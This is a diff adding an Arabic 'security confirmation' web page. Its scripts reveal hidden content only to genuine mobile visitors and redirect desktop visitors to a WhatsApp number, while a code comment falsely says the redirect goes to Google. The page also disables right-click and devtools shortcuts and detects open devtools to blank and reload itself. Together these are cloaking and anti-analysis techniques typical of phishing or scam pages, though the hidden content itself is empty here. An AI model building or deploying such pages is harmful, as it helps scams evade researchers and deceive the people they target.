@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تأكيد الحماية</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        /* منع اختيار النصوص والصور بشكل تام */
+        * {
+            -webkit-touch-callout: none !important;
+            -webkit-user-select: none !important;
+            -khtml-user-select: none !important;
+            -moz-user-select: none !important;
+            -ms-user-select: none !important;
+            user-select: none !important;
+        }
+
+        /* حماية إضافية للصور من السحب والتحميل */
+        img {
+            pointer-events: none !important;
+            -webkit-user-drag: none !important;
+        }
+
+        .hidden-element {
+            display: none !important;
+        }
+    </style>
+
+    <script>
+    // فحص صارم للجوال الحقيقي
+    function isStrictMobile() {
+        let ua = navigator.userAgent || navigator.vendor || window.opera;
+
+        let isMobileUA =
+            /android|iphone|ipad|ipod|blackberry|windows phone|opera mini|iemobile|mobile/i.test(ua);
+
+        // شاشات اللمس الحقيقية فقط
+        let hasTouch =
+            ('ontouchstart' in window) ||
+            navigator.maxTouchPoints > 0;
+
+        // فحص حجم الشاشة
+        let isSmallScreen = window.innerWidth <= 1024;
+
+        // منع أجهزة الكمبيوتر حتى مع Responsive Mode
+        let isDesktopUserAgent =
+            /macintosh|mac os x|windows nt|linux x86_64/i.test(ua);
+
+        if (
+            isDesktopUserAgent &&
+            !(/ipad|iphone|ipod/i.test(ua))
+        ) {
+            return false;
+        }
+
+        return isMobileUA && hasTouch && isSmallScreen;
+    }
+
+    // إغلاق أو تفريغ الصفحة عند اكتشاف DevTools
+    function blockDevTools() {
+        document.body.innerHTML =
+            '<h1 style="text-align:center; margin-top:20%; color:red; font-size:24px;">تم رفض الوصول: محاولة فحص غير مصرح بها.</h1>';
+
+        window.location.reload();
+    }
+
+    // إظهار الصفحة الحقيقية على الجوال فقط
+    (function() {
+        if (isStrictMobile()) {
+            window.addEventListener('DOMContentLoaded', function() {
+
+                var block = document.getElementById('deviceBlock');
+
+                if (block) {
+                    block.classList.add('hidden-element');
+                    block.style.display = 'none';
+                }
+
+                var realPage = document.getElementById('realPage');
+
+                if (realPage) {
+                    realPage.style.display = 'block';
+                }
+            });
+        }
+    })();
+    </script>
+</head>
+
+<body class="m-0 font-sans bg-gray-50">
+
+    <div id="realPage" style="display: none;">
+    </div>
+
+    <div id="deviceBlock"
+         class="fixed inset-0 flex items-center justify-center text-center z-[9999] bg-white">
+
+        <div class="flex flex-col items-center justify-center gap-6 p-4">
+
+            <img
+                src="https://www.namaya.ar/SafeNew.png"
+                class="w-[180px] mx-auto"
+                alt="Security Shield"
+            />
+
+        </div>
+    </div>
+
+    <script>
+    window.addEventListener("load", function() {
+
+        // إذا كان جهاز كمبيوتر
+        if (!isStrictMobile()) {
+
+            let realPage = document.getElementById("realPage");
+
+            if (realPage) {
+                realPage.style.display = "none";
+            }
+
+            // تحويل إلى Google بعد 10 ثوانٍ
+            setTimeout(function() {
+                window.location.href = "https://wa.me/212778845459";
+            }, 10000);
+        }
+    });
+
+
+    // 1. منع الزر الأيمن
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+    }, false);
+
+
+    // 2. منع اختصارات DevTools
+    document.addEventListener("keydown", function(e) {
+
+        if (
+            e.keyCode === 123 || // F12
+
+            (e.ctrlKey &&
+             e.shiftKey &&
+             e.keyCode === 73) || // Ctrl+Shift+I
+
+            (e.ctrlKey &&
+             e.shiftKey &&
+             e.keyCode === 74) || // Ctrl+Shift+J
+
+            (e.ctrlKey &&
+             e.keyCode === 85) || // Ctrl+U
+
+            (e.ctrlKey &&
+             e.shiftKey &&
+             e.keyCode === 67) || // Ctrl+Shift+C
+
+            (e.metaKey &&
+             e.altKey &&
+             e.keyCode === 73) // Cmd+Option+I
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+
+    // 3. كشف DevTools
+    let devtoolsOpen = false;
+
+    const element = new Image();
+
+    Object.defineProperty(element, 'id', {
+        get: function() {
+
+            devtoolsOpen = true;
+
+            blockDevTools();
+        }
+    });
+
+
+    setInterval(function() {
+
+        devtoolsOpen = false;
+
+        console.log('%c', element);
+
+        // فحص فرق حجم نافذة المتصفح
+        if (
+            (window.outerWidth - window.innerWidth > 160) ||
+            (window.outerHeight - window.innerHeight > 160)
+        ) {
+
+            if (!isStrictMobile()) {
+                blockDevTools();
+            }
+        }
+
+    }, 1000);
+
+
+    // 4. منع الطلبات الوهمية المكررة
+    document.addEventListener("submit", function(e) {
+
+        let form = e.target;
+
+        if (
+            form.getAttribute("data-submitting") === "true"
+        ) {
+            e.preventDefault();
+            return false;
+        }
+
+        form.setAttribute("data-submitting", "true");
+
+        // تعطيل زر الإرسال
+        let submitBtn =
+            form.querySelector('[type="submit"]');
+
+        if (submitBtn) {
+
+            submitBtn.disabled = true;
+
+            submitBtn.innerText =
+                "جاري الإرسال...";
+        }
+
+    }, true);
+
+    </script>
+
+</body>
+</html>
